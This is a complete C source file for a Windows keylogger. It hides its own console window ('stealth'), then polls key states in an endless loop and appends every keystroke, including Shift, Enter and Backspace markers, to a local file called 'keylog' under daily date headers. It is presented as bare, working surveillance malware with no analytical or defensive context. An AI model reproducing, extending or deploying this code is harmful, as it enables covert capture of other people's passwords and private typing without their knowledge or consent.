
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>

#define SLEEP_TIME 10

void get_date(void);
void print_date(void);
void check_date(void);
int get_key(void);

char nowdate[11];

int main(void)
{

  HWND stealth; /*creating stealth (window is not visible)*/
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass",NULL);
  ShowWindow(stealth,0);

  print_date();

  while(1){
    Sleep(SLEEP_TIME);
    check_date();
    get_key();
  }
  return 0;
}                                       

void get_date(){
  
  SYSTEMTIME str_t;
  GetSystemTime(&str_t);
  sprintf(nowdate, "%d-%d-%d", str_t.wDay,str_t.wMonth,str_t.wYear);

}

void check_date(){

  SYSTEMTIME str_t;
  GetSystemTime(&str_t);
  char c[11];
  sprintf(c, "%d-%d-%d", str_t.wDay,str_t.wMonth,str_t.wYear);

  if(strcmp(c, nowdate) != 0){
    print_date();
  }

}

void print_date(){
  get_date();
    FILE *file;
    file=fopen("keylog","a+");
    fprintf(file,"\n ---------- ");
    fprintf(file,nowdate);
    fprintf(file," ----------\n");
    fclose(file);
}

int get_key(void){

  short character;

  for(character=8;character<=222;character++){

    if(GetAsyncKeyState(character)==-32767){  
      FILE *file;
      file=fopen("keylog","a+");

      if(file==NULL)  return 1;            
      if(file!=NULL){        
        if((character>=39)&&(character<=64)){
          fputc(character,file);
          fclose(file);
          break;
        }        
        else if((character>64)&&(character<91)){
          character+=32;
          fputc(character,file);
          fclose(file);
          break;
        }
        else{
          switch(character){
            case VK_SPACE:
              fputc(' ',file);
              fclose(file);
              break;    
            case VK_SHIFT:
              fputs("[SHIFT]",file);
              fclose(file);
              break;                                            
            case VK_RETURN:
              fputs("\n[ENTER]",file);
              fclose(file);
              break;
            case VK_BACK:
              fputs("[BACKSPACE]",file);
              fclose(file);
              break;
            case VK_TAB:
              fputs("[TAB]",file);
              fclose(file);
              break;
            case VK_CONTROL:
              fputs("[CTRL]",file);
              fclose(file);
              break;    
            case VK_DELETE:
              fputs("[DEL]",file);
              fclose(file);
              break;
            case VK_OEM_1:
              fputs("[;:]",file);
              fclose(file);
              break;
            case VK_OEM_2:
              fputs("[/?]",file);
              fclose(file);
              break;
            case VK_OEM_3:
              fputs("[`~]",file);
              fclose(file);
              break;
            case VK_OEM_4:
              fputs("[ [{ ]",file);
              fclose(file);
              break;
            case VK_OEM_5:
              fputs("[\\|]",file);
              fclose(file);
              break;                                
            case VK_OEM_6:
              fputs("[ ]} ]",file);
              fclose(file);
              break;
            case VK_OEM_7:
              fputs("['\"]",file);
              fclose(file);
              break;                                            
            case VK_NUMPAD0:
              fputc('0',file);
              fclose(file);
              break;
            case VK_NUMPAD1:
              fputc('1',file);
              fclose(file);
              break;
            case VK_NUMPAD2:
              fputc('2',file);
              fclose(file);
              break;
            case VK_NUMPAD3:
              fputc('3',file);
              fclose(file);
              break;
            case VK_NUMPAD4:
              fputc('4',file);
              fclose(file);
              break;
            case VK_NUMPAD5:
              fputc('5',file);
              fclose(file);
              break;
            case VK_NUMPAD6:
              fputc('6',file);
              fclose(file);
              break;
            case VK_NUMPAD7:
              fputc('7',file);
              fclose(file);
              break;
            case VK_NUMPAD8:
              fputc('8',file);
              fclose(file);
              break;
            case VK_NUMPAD9:
              fputc('9',file);
              fclose(file);
              break;
            case VK_CAPITAL:
              fputs("[CAPS LOCK]",file);
              fclose(file);
              break;
            default:
              fclose(file);
              break;
          } //END OF SWITCH
        } //END OF ELSE
      }    // END OF IF    
    }   //END OF IF
  }     // LOOP END
  return 0;                                                
}